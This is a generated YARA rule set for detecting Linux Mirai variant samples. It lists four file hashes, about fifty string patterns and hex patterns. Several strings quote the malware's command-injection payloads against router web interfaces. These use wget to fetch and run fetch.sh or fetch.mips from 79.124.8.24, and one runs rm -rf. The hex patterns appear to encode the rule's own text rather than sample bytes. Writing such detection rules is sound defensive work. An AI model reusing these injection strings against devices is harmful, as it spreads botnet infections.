
/*
   YARA Rule Set
   Author: resteex
   Identifier: Linux_Mirai_B 
   /
/* Rule Set ----------------------------------------------------------------- */

rule resteex_Linux_Mirai_B {
	meta: 
		 description= "Linux_Mirai_B Group" 
		 author = "Resteex Generator" 
		 date = "2022-01-10_19-26-45" 
		 license = "https://github.com/resteex0/yarex"
		 hash1= "0a5852e0dd9ac8cc990d852ea1b7fdee"
		 hash2= "390f1382237b5a01dd46bf1404c223e7"
		 hash3= "9a6e4b8a6ba5b4f5a408919d2c169d92"
		 hash4= "f94541b48f85af92ea43e53d8b011aad"

	strings:

	
 		 $a1= "/////////2/////1//1//1/////N/////L///3/2///////////////////0//0////" fullword ascii
		 $a2= "///2///1//2///M//////////////22////N//R1//////112//////////12//////1/////1/////////////////////////0" fullword ascii
		 $a3= ".///2////2////1///N////1/////N/////N//O/////2//0//1///L1//M/////K//K2///" fullword ascii
		 $a4= "/2/301////2/////111/1///1///////////" fullword ascii
		 $a5= "24/fetch.sh%3B%20sh%20fetch.sh&loginUser=a&loginPwd=a" fullword ascii
		 $a6= "/361////////2//////////3/M//////0/////2/21//////////////2////2///1///1//5/////N/////5///////////////" fullword ascii
		 $a7= ".//////4/1//////1////1//1////N///////M//21///M////1///////////N//////////N//////////O///////////////" fullword ascii
		 $a8= ".//////5/01/R////P////P////P////P///0" fullword ascii
		 $a9= "8.24%2Ffetch.sh+%7C+%2Ffetch%2Fsh;sh+fetch%2Fsh" fullword ascii
		 $a10= "abcdefghijklmnopqrstuvw012345678" fullword ascii
		 $a11= "Accept-Language:en-US,en-GB;q=0.9,en;q=0.8,it-IT;q=0.7,it;q=0.6,es;q=0.5,de;q=0.4" fullword ascii
		 $a12= "action=login&keyPath=action=login&keyPath=cd%20/tmp%3B%20rm%20-rf%20*%3B%20wget%20http%3A//79.124.8." fullword ascii
		 $a13= "ccp_act=ping_v6&ping_addr=$(wget${IFS}http://79.124.8.24/fetch.sh${IFS}-O${IFS}/tmp/run.sh;sh+run.sh" fullword ascii
		 $a14= "command=%7C%7C+busybox+wget+-O+-+http%3A%2F%2F79.124.8.24%2Ffetch.sh+%7C+%2Ffetch%2Fsh+sh+fetch%2Fsh" fullword ascii
		 $a15= "_dl_nothread_init_static_tls" fullword ascii
		 $a16= "_dl_tls_dtv_slotinfo_list" fullword ascii
		 $a17= "__do_global_dtors_aux_fini_array_entry" fullword ascii
		 $a18= "__fork_generation_pointer" fullword ascii
		 $a19= "__frame_dummy_init_array_entry" fullword ascii
		 $a20= "__gnu_Unwind_ForcedUnwind" fullword ascii
		 $a21= "__gnu_Unwind_RaiseException" fullword ascii
		 $a22= "__gnu_Unwind_Resume_or_Rethrow" fullword ascii
		 $a23= "/home/landley/aboriginal/aboriginal/build/simple-cross-compiler-armv7l/bin/../cc/include" fullword ascii
		 $a24= "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii
		 $a25= "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii
		 $a26= "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
		 $a27= "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
		 $a28= "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii
		 $a29= "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii
		 $a30= "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii
		 $a31= "J//////2/6///////2/6///////0//1////62" fullword ascii
		 $a32= "__libc_disable_asynccancel" fullword ascii
		 $a33= "__libc_enable_asynccancel" fullword ascii
		 $a34= "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=wget+-O+-+http%3A%2F%2F79.124." fullword ascii
		 $a35= "phase2_call_unexpected_after_unwind" fullword ascii
		 $a36= "program_invocation_short_name" fullword ascii
		 $a37= "_pthread_cleanup_pop_restore" fullword ascii
		 $a38= "_pthread_cleanup_push_defer" fullword ascii
		 $a39= "__pthread_initialize_minimal" fullword ascii
		 $a40= "_stdio_openlist_del_count" fullword ascii
		 $a41= "_stdio_openlist_use_count" fullword ascii
		 $a42= "sysCmd=wget&sh&fetch.sh&apply=Apply&msg=http://79.124.8.24/fetch.sh" fullword ascii
		 $a43= "->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0" fullword ascii
		 $a44= "->/tmp/gpon80;sh+/tmp/gpon80&ipv=0" fullword ascii
		 $a45= "_Unwind_GetLanguageSpecificData" fullword ascii
		 $a46= "___Unwind_Resume_or_Rethrow" fullword ascii
		 $a47= "_Unwind_Resume_or_Rethrow" fullword ascii
		 $a48= "_Unwind_VRS_DataRepresentation" fullword ascii
		 $a49= "_URC_FOREIGN_EXCEPTION_CAUGHT" fullword ascii
		 $a50= "_US_UNWIND_FRAME_STARTING" fullword ascii
		 $a51= "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://79.124.8.24/fetch.mips+-O+" fullword ascii

		 $hex1= {246131303d20226162}
		 $hex2= {246131313d20224163}
		 $hex3= {246131323d20226163}
		 $hex4= {246131333d20226363}
		 $hex5= {246131343d2022636f}
		 $hex6= {246131353d20225f64}
		 $hex7= {246131363d20225f64}
		 $hex8= {246131373d20225f5f}
		 $hex9= {246131383d20225f5f}
		 $hex10= {246131393d20225f5f}
		 $hex11= {2461313d20222f2f2f}
		 $hex12= {246132303d20225f5f}
		 $hex13= {246132313d20225f5f}
		 $hex14= {246132323d20225f5f}
		 $hex15= {246132333d20222f68}
		 $hex16= {246132343d20222f68}
		 $hex17= {246132353d20222f68}
		 $hex18= {246132363d20222f68}
		 $hex19= {246132373d20222f68}
		 $hex20= {246132383d20222f68}
		 $hex21= {246132393d20222f68}
		 $hex22= {2461323d20222f2f2f}
		 $hex23= {246133303d20222f68}
		 $hex24= {246133313d20224a2f}
		 $hex25= {246133323d20225f5f}
		 $hex26= {246133333d20225f5f}
		 $hex27= {246133343d20225f6d}
		 $hex28= {246133353d20227068}
		 $hex29= {246133363d20227072}
		 $hex30= {246133373d20225f70}
		 $hex31= {246133383d20225f70}
		 $hex32= {246133393d20225f5f}
		 $hex33= {2461333d20222e2f2f}
		 $hex34= {246134303d20225f73}
		 $hex35= {246134313d20225f73}
		 $hex36= {246134323d20227379}
		 $hex37= {246134333d20222d3e}
		 $hex38= {246134343d20222d3e}
		 $hex39= {246134353d20225f55}
		 $hex40= {246134363d20225f5f}
		 $hex41= {246134373d20225f55}
		 $hex42= {246134383d20225f55}
		 $hex43= {246134393d20225f55}
		 $hex44= {2461343d20222f322f}
		 $hex45= {246135303d20225f55}
		 $hex46= {246135313d20225857}
		 $hex47= {2461353d202232342f}
		 $hex48= {2461363d20222f3336}
		 $hex49= {2461373d20222e2f2f}
		 $hex50= {2461383d20222e2f2f}
		 $hex51= {2461393d2022382e32}

	condition:
		6 of them
}
